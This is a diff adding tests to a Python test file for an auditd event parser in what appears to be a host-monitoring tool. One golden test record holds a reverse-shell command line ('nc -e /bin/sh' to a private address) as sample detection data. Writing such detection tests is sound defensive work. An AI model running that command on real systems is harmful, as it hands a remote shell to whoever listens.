@@ -1,4 +1,13 @@
-from auditd_source import parse_event, _parse_kv, _parse_msg_ts
+import os
+import re
+
+from auditd_source import _EXECVE_SYSCALLS, parse_event, _parse_kv, _parse_msg_ts
+
+_RULES = os.path.abspath(
+    os.path.join(
+        os.path.dirname(__file__), "..", "..", "..", "deploy", "audit", "sentinel.rules"
+    )
+)
 
 SYSCALL = (
     "type=SYSCALL msg=audit(1700000000.123:4567): arch=c000003e syscall=59 "
@@ -73,3 +82,40 @@ def test_unparseable_timestamp_is_empty_not_fabricated():
     syscall = 'type=SYSCALL msg=audit(BROKEN): syscall=59 pid=1 uid=0 comm="x" exe="/x"'
     ev = parse_event([syscall])
     assert ev["timestamp"] == ""
+
+
+def test_rules_artifact_only_arms_syscalls_the_parser_consumes():
+    """deploy/audit/sentinel.rules and parse_event are a contract: rules for
+    syscalls outside _EXECVE_SYSCALLS emit records the pipeline silently
+    drops. Adding a syscall to the ruleset requires teaching the parser first.
+    """
+    with open(_RULES) as fh:
+        rules = [ln.strip() for ln in fh if ln.strip().startswith("-a")]
+    assert rules, "sentinel.rules must arm at least one audit rule"
+    for rule in rules:
+        m = re.search(r"-S\s+(\S+)", rule)
+        assert m, f"audit rule without a syscall filter: {rule}"
+        for syscall in m.group(1).split(","):
+            assert (
+                syscall in _EXECVE_SYSCALLS
+            ), f"{syscall!r} armed in sentinel.rules but parse_event drops it"
+        assert "-k sentinel_exec" in rule, rule
+
+
+def test_golden_record_as_emitted_under_the_rules_parses():
+    """A SYSCALL+EXECVE pair shaped exactly like auditd output under the
+    shipped ruleset (key="sentinel_exec") must build a HostEvent."""
+    syscall = (
+        "type=SYSCALL msg=audit(1751900000.123:99): arch=c000003e syscall=59 "
+        "success=yes exit=0 ppid=1000 pid=1001 auid=1000 uid=1000 gid=1000 "
+        'comm="nc" exe="/usr/bin/nc" key="sentinel_exec"'
+    )
+    execve = (
+        "type=EXECVE msg=audit(1751900000.123:99): argc=4 "
+        'a0="nc" a1="-e" a2="/bin/sh" a3="10.0.0.5"'
+    )
+    ev = parse_event([syscall, execve])
+    assert ev is not None
+    assert ev["comm"] == "nc"
+    assert ev["exe"] == "/usr/bin/nc"
+    assert ev["args"] == ["nc", "-e", "/bin/sh", "10.0.0.5"]
